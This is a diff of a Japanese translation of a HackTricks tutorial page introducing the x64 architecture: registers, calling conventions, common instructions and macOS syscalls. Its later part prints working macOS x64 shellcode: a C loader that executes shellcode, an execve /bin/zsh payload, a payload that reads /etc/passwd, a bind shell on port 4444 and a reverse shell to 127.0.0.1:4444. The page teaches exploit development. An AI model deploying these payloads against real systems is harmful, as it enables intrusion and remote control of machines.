@@ -1,26 +1,26 @@
-# Introduction to x64
+# x64への導入
 
 <details>
 
-<summary><strong>htARTE（HackTricks AWS Red Team Expert）</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>を通じてゼロからヒーローまでAWSハッキングを学ぶ</strong></a><strong>！</strong></summary>
+<summary><strong>htARTE（HackTricks AWS Red Team Expert）</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>でAWSハッキングをゼロからヒーローまで学ぶ</strong></a><strong>！</strong></summary>
 
 HackTricksをサポートする他の方法：
 
-* **HackTricksで企業を宣伝**したい場合や**HackTricksをPDFでダウンロード**したい場合は、[**SUBSCRIPTION PLANS**](https://github.com/sponsors/carlospolop)をチェックしてください！
-* [**公式PEASS＆HackTricksスウェグ**](https://peass.creator-spring.com)を入手する
-* [**The PEASS Family**](https://opensea.io/collection/the-peass-family)を発見し、独占的な[**NFTs**](https://opensea.io/collection/the-peass-family)コレクションを見つける
-* **💬** [**Discordグループ**](https://discord.gg/hRep4RUj7f)**に参加するか、**[**Telegramグループ**](https://t.me/peass)**に参加するか、Twitter 🐦でフォロー**する：[**@carlospolopm**](https://twitter.com/hacktricks\_live)。
-* **ハッキングトリックを共有するには、PRを** [**HackTricks**](https://github.com/carlospolop/hacktricks) **と** [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) **のGitHubリポジトリに提出してください。**
+- **HackTricksで企業を宣伝**したい場合や**HackTricksをPDFでダウンロード**したい場合は、[**SUBSCRIPTION PLANS**](https://github.com/sponsors/carlospolop)をチェックしてください！
+- [**公式PEASS＆HackTricksスウォッグ**](https://peass.creator-spring.com)を入手する
+- [**The PEASS Family**](https://opensea.io/collection/the-peass-family)を発見し、独占的な[**NFTs**](https://opensea.io/collection/the-peass-family)コレクションを見つける
+- **💬 [Discordグループ](https://discord.gg/hRep4RUj7f)**に参加するか、[telegramグループ](https://t.me/peass)に参加するか、**Twitter** 🐦 [**@carlospolopm**](https://twitter.com/hacktricks_live)をフォローする
+- **ハッキングトリックを共有するには、**[**HackTricks**](https://github.com/carlospolop/hacktricks)と[**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud)のGitHubリポジトリにPRを提出してください。
 
 </details>
 
-## **x64の概要**
+## **x64への導入**
 
-x64、またはx86-64としても知られるものは、デスクトップやサーバーのコンピューティングで主に使用される64ビットプロセッサアーキテクチャです。Intelによって生産されたx86アーキテクチャから派生し、後にAMDがAMD64という名前で採用したもので、現在のパーソナルコンピュータやサーバーで一般的なアーキテクチャです。
+x64、またはx86-64としても知られる64ビットプロセッサアーキテクチャは、主にデスクトップおよびサーバーコンピューティングで使用されています。Intelによって生産されたx86アーキテクチャから派生し、後にAMDがAMD64という名前で採用したもので、現在は個人コンピュータやサーバーで一般的なアーキテクチャです。
 
 ### **レジスタ**
 
-x64はx86アーキテクチャを拡張し、`rax`、`rbx`、`rcx`、`rdx`、`rbp`、`rsp`、`rsi`、`rdi`、`r8`から`r15`までの**16個の汎用レジスタ**を備えています。これらの各レジスタは**64ビット**（8バイト）の値を格納できます。これらのレジスタには互換性と特定のタスクのための32ビット、16ビット、8ビットのサブレジスタもあります。
+x64はx86アーキテクチャを拡張し、`rax`、`rbx`、`rcx`、`rdx`、`rbp`、`rsp`、`rsi`、`rdi`、`r8`から`r15`までの**16個の汎用レジスタ**を備えています。これらの各レジスタは**64ビット**（8バイト）の値を格納できます。これらのレジスタには、互換性と特定のタスクのための32ビット、16ビット、8ビットのサブレジスタもあります。
 
 1. **`rax`** - 通常、関数からの**戻り値**に使用されます。
 2. **`rbx`** - メモリ操作の**ベースレジスタ**としてよく使用されます。
@@ -28,61 +28,59 @@ x64はx86アーキテクチャを拡張し、`rax`、`rbx`、`rcx`、`rdx`、`rb
 4. **`rdx`** - 拡張算術演算を含むさまざまな役割で使用されます。
 5. **`rbp`** - スタックフレームの**ベースポインタ**。
 6. **`rsp`** - スタックのトップを追跡する**スタックポインタ**。
-7. **`rsi`および`rdi`** - 文字列/メモリ操作の**ソース**および**宛先**インデックスに使用されます。
+7. **`rsi`**および**`rdi`** - 文字列/メモリ操作の**ソース**および**宛先**インデックスに使用されます。
 8. **`r8`** から **`r15`** - x64で導入された追加の汎用レジスタ。
 
 ### **呼び出し規約**
 
 x64の呼び出し規約はオペレーティングシステムによって異なります。例えば：
 
-* **Windows**：最初の**4つのパラメータ**はレジスタ\*\*`rcx`**、**`rdx`**、**`r8`**、**`r9`**に渡されます。追加のパラメータはスタックにプッシュされます。戻り値は**`rax`\*\*に格納されます。
-* **System V（UNIXライクなシステムで一般的に使用される）**：最初の**6つの整数またはポインタパラメータ**はレジスタ\*\*`rdi`**、**`rsi`**、**`rdx`**、**`rcx`**、**`r8`**、**`r9`**に渡されます。戻り値も**`rax`\*\*にあります。
+- **Windows**: 最初の**4つのパラメータ**はレジスタ**`rcx`**、**`rdx`**、**`r8`**、**`r9`**に渡されます。それ以降のパラメータはスタックにプッシュされます。戻り値は**`rax`**に格納されます。
+- **System V（UNIXライクなシステムで一般的に使用される）**: 最初の**6つの整数またはポインタパラメータ**はレジスタ**`rdi`**、**`rsi`**、**`rdx`**、**`rcx`**、**`r8`**、**`r9`**に渡されます。戻り値も**`rax`**にあります。
 
-関数に6つ以上の入力がある場合、**残りはスタックに渡されます**。スタックポインタである**RSP**は**16バイトアライン**でなければならず、つまり、任意の呼び出し前に指すアドレスが16で割り切れる必要があります。通常、関数呼び出し前にRSPが適切に整列されていることを確認する必要がありますが、実際には、この要件を満たさなくてもシステムコールは多くの場合動作します。
+関数に6つ以上の入力がある場合、**残りはスタックに渡されます**。スタックポインタである**RSP**は**16バイトに整列**されている必要があります。つまり、呼び出しが発生する前に指すアドレスが16で割り切れる必要があります。通常、私たちは関数呼び出し前にシェルコード内でRSPが適切に整列されていることを確認する必要があります。ただし、実際には、この要件を満たさなくてもシステムコールは多くの場合動作します。
 
-### Swiftの呼び出し規約
+### Swiftにおける呼び出し規約
 
 Swiftには独自の**呼び出し規約**があり、[**https://github.com/apple/swift/blob/main/docs/ABI/CallConvSummary.rst#x86-64**](https://github.com/apple/swift/blob/main/docs/ABI/CallConvSummary.rst#x86-64)で見つけることができます。
 
 ### **一般的な命令**
 
-x64命令には豊富なセットがあり、以前のx86命令との互換性を維持し、新しい命令を導入しています。
+x64命令には、以前のx86命令との互換性を維持し、新しい命令を導入する豊富なセットがあります。
 
-* **`mov`**：1つの**レジスタ**または**メモリ位置**から別の場所に値を**移動**します。
-  * 例：`mov rax, rbx` — `rbx`から`rax`に値を移動します。
-* **`push`および`pop`**：スタックに値を**プッシュ**または**ポップ**します。
-  * 例：`push rax` — `rax`の値をスタックにプッシュします。
-  * 例：`pop rax` — スタックのトップの値を`rax`にポップします。
-* **`add`および`sub`**：**加算**および**減算**演算。
-  * 例：`add rax, rcx` — `rax`と`rcx`の値を加算し、結果を`rax`に格納します。
-* **`mul`および`div`**：**乗算**および**除算**演算。注：これらはオペランドの使用に関して特定の動作があります。
-* **`call`および`ret`**：関数の**呼び出し**および**戻り**に使用されます。
-* **`int`**：ソフトウェアの**割り込み**をトリガーに使用されます。例：32ビットx86 Linuxでは、システムコールに`int 0x80`が使用されました。
-* **`cmp`**：2つの値を比較し、結果に基づいてCPUのフラグを設定します。
-  * 例：`cmp rax, rdx` — `rax`を`rdx`と比較します。
-* **`je`、`jne`、`jl`、`jge`など**：前の`cmp`またはテストの結果に基づいて制御フローを変更する**条件付きジャンプ**命令。
-  * 例：`cmp rax, rdx`命令の後、`je label` — `rax`が`rdx`と等しい場合、`label`にジャンプします。
-* **`syscall`**：一部のx64システム（現代のUnixなど）で**システムコール**に使用されます。
-* **`sysenter`**：一部のプラットフォームで最適化された**システムコール**命令。
+- **`mov`**: 1つの**レジスタ**または**メモリ位置**から別の場所に値を**移動**します。
+  - 例: `mov rax, rbx` — `rbx`から`rax`に値を移動します。
+- **`push`**および**`pop`**: スタックに値を**プッシュ**または**ポップ**します。
+  - 例: `push rax` — `rax`の値をスタックにプッシュします。
+  - 例: `pop rax` — スタックのトップの値を`rax`にポップします。
+- **`add`**および**`sub`**: **加算**および**減算**演算。
+  - 例: `add rax, rcx` — `rax`と`rcx`の値を加算し、結果を`rax`に格納します。
+- **`mul`**および**`div`**: **乗算**および**除算**演算。注：これらはオペランドの使用に関する特定の動作があります。
+- **`call`**および**`ret`**: 関数の**呼び出し**および**戻り**に使用されます。
+- **`int`**: ソフトウェア**割り込み**をトリガーするために使用されます。例: 32ビットx86 Linuxでは、システムコールに`int 0x80`が使用されました。
+- **`cmp`**: 2つの値を比較し、結果に基づいてCPUのフラグを設定します。
+  - 例: `cmp rax, rdx` — `rax`を`rdx`と比較します。
+- **`je`、`jne`、`jl`、`jge`、...**: **条件付きジャンプ**命令で、前の`cmp`またはテストの結果に基づいて制御フローを変更します。
+  - 例: `cmp rax, rdx`命令の後、`je label` — `rax`が`rdx`と等しい場合、`label`にジャンプします。
+- **`syscall`**: 一部のx64システム（現代のUnixなど）で**システムコール**に使用されます。
+- **`sysenter`**: 一部のプラットフォームで最適化された**システムコール**命令です。
 
 ### **関数プロローグ**
 
-1. **古いベースポインタをプッシュ**：`push rbp`（呼び出し元のベースポインタを保存）
-2. **現在のスタックポインタをベースポインタに移動**：`mov rbp, rsp`（現在の関数のための新しいベースポインタを設定）
-3. **ローカル変数のためにスタック上にスペースを確保**：`sub rsp, <size>`（ここで`<size>`は必要なバイト数です）
+1. **古いベースポインタをプッシュ**: `push rbp`（呼び出し元のベースポインタを保存）
+2. **現在のスタックポインタをベースポインタに移動**: `mov rbp, rsp`（現在の関数の新しいベースポインタを設定）
+3. **ローカル変数のためにスタック上にスペースを確保**: `sub rsp, <size>`（`<size>`は必要なバイト数です）
 
 ### **関数エピローグ**
 
-1. **現在のベースポインタをスタックポインタに移動**：`mov rsp, rbp`（ローカル変数を解放）
-2. **古いベースポインタをスタックからポップ**：`pop rbp`（呼び出し元のベースポインタを復元）
-3. **戻る**：`ret`（呼び出し元に制御を返す）
-
+1. **現在のベースポインタをスタックポインタに移動**: `mov rsp, rbp`（ローカル変数を解放）
+2. **古いベースポインタをスタックからポップ**: `pop rbp`（呼び出し元のベースポインタを復元）
+3. **戻る**: `ret`（呼び出し元に制御を返す）
 ## macOS
 
-### シスコール
+### システムコール
 
-異なるクラスのシスコールがあり、[**こちらで見つけることができます**](https://opensource.apple.com/source/xnu/xnu-1504.3.12/osfmk/mach/i386/syscall\_sw.h)**:**
-
+異なるクラスのシステムコールがあります、[**こちらで見つけることができます**](https://opensource.apple.com/source/xnu/xnu-1504.3.12/osfmk/mach/i386/syscall\_sw.h)**:**
 ```c
 #define SYSCALL_CLASS_NONE	0	/* Invalid */
 #define SYSCALL_CLASS_MACH	1	/* Mach */
@@ -91,9 +89,7 @@ x64命令には豊富なセットがあり、以前のx86命令との互換性�
 #define SYSCALL_CLASS_DIAG	4	/* Diagnostics */
 #define SYSCALL_CLASS_IPC	5	/* Mach IPC */
 ```
-
-次に、各システムコール番号を[**このURL**](https://opensource.apple.com/source/xnu/xnu-1504.3.12/bsd/kern/syscalls.master)**で見つけることができます。**
-
+次に、[**このURL**](https://opensource.apple.com/source/xnu/xnu-1504.3.12/bsd/kern/syscalls.master)で各システムコール番号を見つけることができます。
 ```c
 0	AUE_NULL	ALL	{ int nosys(void); }   { indirect syscall }
 1	AUE_EXIT	ALL	{ void exit(int rval); }
@@ -110,7 +106,6 @@ x64命令には豊富なセットがあり、以前のx86命令との互換性�
 12	AUE_CHDIR	ALL	{ int chdir(user_addr_t path); }
 [...]
 ```
-
 したがって、**Unix/BSDクラス**から`open`シスコール(**5**)を呼び出すためには、`0x2000000`を追加する必要があります。
 
 したがって、openを呼び出すためのシスコール番号は`0x2000005`になります。
@@ -126,11 +121,11 @@ ld -o shell shell.o -macosx_version_min 13.0 -lSystem -L /Library/Developer/Comm
 ```
 {% endcode %}
 
-バイトを抽出するには：
+バイトを抽出するには:
 
 {% code overflow="wrap" %}
 ```bash
-# Code from https://github.com/daem0nc0re/macOS_ARM64_Shellcode/blob/master/helper/extract.sh
+# Code from https://github.com/daem0nc0re/macOS_ARM64_Shellcode/blob/b729f716aaf24cbc8109e0d94681ccb84c0b0c9e/helper/extract.sh
 for c in $(objdump -d "shell.o" | grep -E '[0-9a-f]+:' | cut -f 1 | cut -d : -f 2) ; do
 echo -n '\\x'$c
 done
@@ -143,42 +138,59 @@ otool -t shell.o | grep 00 | cut -f2 -d$'\t' | sed 's/ /\\x/g' | sed 's/^/\\x/g'
 <details>
 
 <summary>シェルコードをテストするためのCコード</summary>
+```c
+// code from https://github.com/daem0nc0re/macOS_ARM64_Shellcode/blob/master/helper/loader.c
+// gcc loader.c -o loader
+#include <stdio.h>
+#include <sys/mman.h>
+#include <string.h>
+#include <stdlib.h>
 
-\`\`\`c // code from https://github.com/daem0nc0re/macOS\_ARM64\_Shellcode/blob/master/helper/loader.c // gcc loader.c -o loader #include #include #include #include
+int (*sc)();
 
-int (\*sc)();
+char shellcode[] = "<INSERT SHELLCODE HERE>";
 
-char shellcode\[] = "";
+int main(int argc, char **argv) {
+printf("[>] Shellcode Length: %zd Bytes\n", strlen(shellcode));
 
-int main(int argc, char \*\*argv) { printf("\[>] Shellcode Length: %zd Bytes\n", strlen(shellcode));
+void *ptr = mmap(0, 0x1000, PROT_WRITE | PROT_READ, MAP_ANON | MAP_PRIVATE | MAP_JIT, -1, 0);
 
-void \*ptr = mmap(0, 0x1000, PROT\_WRITE | PROT\_READ, MAP\_ANON | MAP\_PRIVATE | MAP\_JIT, -1, 0);
+if (ptr == MAP_FAILED) {
+perror("mmap");
+exit(-1);
+}
+printf("[+] SUCCESS: mmap\n");
+printf("    |-> Return = %p\n", ptr);
 
-if (ptr == MAP\_FAILED) { perror("mmap"); exit(-1); } printf("\[+] SUCCESS: mmap\n"); printf(" |-> Return = %p\n", ptr);
+void *dst = memcpy(ptr, shellcode, sizeof(shellcode));
+printf("[+] SUCCESS: memcpy\n");
+printf("    |-> Return = %p\n", dst);
 
-void \*dst = memcpy(ptr, shellcode, sizeof(shellcode)); printf("\[+] SUCCESS: memcpy\n"); printf(" |-> Return = %p\n", dst);
+int status = mprotect(ptr, 0x1000, PROT_EXEC | PROT_READ);
 
-int status = mprotect(ptr, 0x1000, PROT\_EXEC | PROT\_READ);
+if (status == -1) {
+perror("mprotect");
+exit(-1);
+}
+printf("[+] SUCCESS: mprotect\n");
+printf("    |-> Return = %d\n", status);
 
-if (status == -1) { perror("mprotect"); exit(-1); } printf("\[+] SUCCESS: mprotect\n"); printf(" |-> Return = %d\n", status);
+printf("[>] Trying to execute shellcode...\n");
 
-printf("\[>] Trying to execute shellcode...\n");
+sc = ptr;
+sc();
 
-sc = ptr; sc();
-
-return 0; }
-
-````
+return 0;
+}
+```
 </details>
 
 #### シェル
 
 [**こちら**](https://github.com/daem0nc0re/macOS\_ARM64\_Shellcode/blob/master/shell.s)から取得し、説明します。
 
-<div data-gb-custom-block data-tag="tabs"></div>
-
-<div data-gb-custom-block data-tag="tab" data-title='adrを使用'>
-
+{% tabs %}
+{% tab title="with adr" %}
 ```armasm
 bits 64
 global _main
@@ -192,16 +204,28 @@ push    59                ; put 59 on the stack (execve syscall)
 pop     rax               ; pop it to RAX
 bts     rax, 25           ; set the 25th bit to 1 (to add 0x2000000 without using null bytes)
 syscall
-````
+```
+{% endtab %}
 
-\`\`\`armasm bits 64 global \_main
+{% tab title="スタックを使用して" %}
+```armasm
+bits 64
+global _main
 
-\_main: xor rdx, rdx ; zero our RDX push rdx ; push NULL string terminator mov rbx, '/bin/zsh' ; move the path into RBX push rbx ; push the path, to the stack mov rdi, rsp ; store the stack pointer in RDI (arg1) push 59 ; put 59 on the stack (execve syscall) pop rax ; pop it to RAX bts rax, 25 ; set the 25th bit to 1 (to add 0x2000000 without using null bytes) syscall
+_main:
+xor     rdx, rdx          ; zero our RDX
+push    rdx               ; push NULL string terminator
+mov     rbx, '/bin/zsh'   ; move the path into RBX
+push    rbx               ; push the path, to the stack
+mov     rdi, rsp          ; store the stack pointer in RDI (arg1)
+push    59                ; put 59 on the stack (execve syscall)
+pop     rax               ; pop it to RAX
+bts     rax, 25           ; set the 25th bit to 1 (to add 0x2000000 without using null bytes)
+syscall
+```
+#### catコマンドで読み取る
 
-````
-#### catコマンドで読む
-
-目標は、`execve("/bin/cat", ["/bin/cat", "/etc/passwd"], NULL)`を実行することです。したがって、2番目の引数（x1）はパラメータの配列でなければなりません（メモリ内ではアドレスのスタックを意味します）。
+目標は、`execve("/bin/cat", ["/bin/cat", "/etc/passwd"], NULL)`を実行することです。したがって、2番目の引数（x1）はパラメータの配列でなければなりません（メモリ内では、これらはアドレスのスタックを意味します）。
 ```armasm
 bits 64
 section .text
@@ -231,10 +255,8 @@ syscall         ; Make the syscall
 section .data
 cat_path:      db "/bin/cat", 0
 passwd_path:   db "/etc/passwd", 0
-````
-
-**shを使用してコマンドを呼び出す**
-
+```
+#### shを使用してコマンドを呼び出す
 ```armasm
 bits 64
 section .text
@@ -272,11 +294,9 @@ sh_path:        db "/bin/sh", 0
 sh_c_option:    db "-c", 0
 touch_command:  db "touch /tmp/lalala", 0
 ```
+#### バインドシェル
 
-**バインドシェル**
-
-[https://packetstormsecurity.com/files/151731/macOS-TCP-4444-Bind-Shell-Null-Free-Shellcode.html](https://packetstormsecurity.com/files/151731/macOS-TCP-4444-Bind-Shell-Null-Free-Shellcode.html)からのバインドシェルを**ポート4444**で提供します。
-
+バインドシェルは[https://packetstormsecurity.com/files/151731/macOS-TCP-4444-Bind-Shell-Null-Free-Shellcode.html](https://packetstormsecurity.com/files/151731/macOS-TCP-4444-Bind-Shell-Null-Free-Shellcode.html)から**ポート4444**で提供されます。
 ```armasm
 section .text
 global _main
@@ -351,11 +371,9 @@ mov  rax, r8
 mov  al, 0x3b
 syscall
 ```
-
-**リバースシェル**
+#### リバースシェル
 
 [https://packetstormsecurity.com/files/151727/macOS-127.0.0.1-4444-Reverse-Shell-Shellcode.html](https://packetstormsecurity.com/files/151727/macOS-127.0.0.1-4444-Reverse-Shell-Shellcode.html) からのリバースシェル。**127.0.0.1:4444** へのリバースシェル
-
 ```armasm
 section .text
 global _main
@@ -417,7 +435,16 @@ mov  rax, r8
 mov  al, 0x3b
 syscall
 ```
+<details>
 
+<summary><strong>htARTE（HackTricks AWS Red Team Expert）</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>を通じてゼロからヒーローまでAWSハッキングを学ぶ</strong></a><strong>！</strong></summary>
 
+HackTricksをサポートする他の方法:
+
+* **HackTricksで企業を宣伝したい**または**HackTricksをPDFでダウンロードしたい**場合は、[**SUBSCRIPTION PLANS**](https://github.com/sponsors/carlospolop)をチェックしてください！
+* [**公式PEASS＆HackTricksスワッグ**](https://peass.creator-spring.com)を入手する
+* [**The PEASS Family**](https://opensea.io/collection/the-peass-family)を発見し、独占的な[**NFTs**](https://opensea.io/collection/the-peass-family)コレクションをご覧ください
+* 💬 [**Discordグループ**](https://discord.gg/hRep4RUj7f)または[**telegramグループ**](https://t.me/peass)に**参加**するか、**Twitter** 🐦 [**@carlospolopm**](https://twitter.com/hacktricks_live)で**フォロー**してください。
+* **HackTricks**および**HackTricks Cloud**のgithubリポジトリにPRを提出して、**あなたのハッキングテクニックを共有**してください。
 
 </details>
